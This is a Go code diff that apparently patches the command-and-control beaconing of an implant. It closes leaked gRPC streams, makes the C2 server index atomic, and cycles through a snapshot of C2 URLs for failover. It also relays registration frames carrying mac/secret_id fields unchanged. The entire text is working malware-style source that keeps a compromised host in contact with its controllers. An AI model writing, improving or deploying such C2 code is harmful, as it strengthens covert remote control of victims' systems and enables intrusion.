@@ -116,6 +116,9 @@ func grpcSendBeacon(body []byte) ([]byte, error) {
 	if err != nil {
 		return nil, fmt.Errorf("gRPC stream open failed: %w", err)
 	}
+	// Release the server-side stream on every return path; otherwise each
+	// beacon leaks a stream until the gRPC connection is torn down.
+	defer stream.CloseSend()
 
 	// The envelope is relayed verbatim (opaque bytes): handshake/registration
 	// frames carry mac/secret_id fields that a struct round-trip would drop.
@@ -136,10 +139,11 @@ func grpcSendBeacon(body []byte) ([]byte, error) {
 }
 
 func sendGRPCBeacon(body []byte) []byte {
-	startIdx := currentC2Idx
-	for i := 0; i < len(C2URLs); i++ {
-		idx := (startIdx + i) % len(C2URLs)
-		c2URL := C2URLs[idx]
+	startIdx := int(currentC2Idx.Load())
+	urls := c2URLsSnapshot()
+	for i := 0; i < len(urls); i++ {
+		idx := (startIdx + i) % len(urls)
+		c2URL := urls[idx]
 
 		if err := initGRPCClient(c2URL); err != nil {
 			if Debug {
@@ -157,7 +161,7 @@ func sendGRPCBeacon(body []byte) []byte {
 			continue
 		}
 
-		currentC2Idx = idx
+		currentC2Idx.Store(int32(idx))
 		return resp
 	}
 
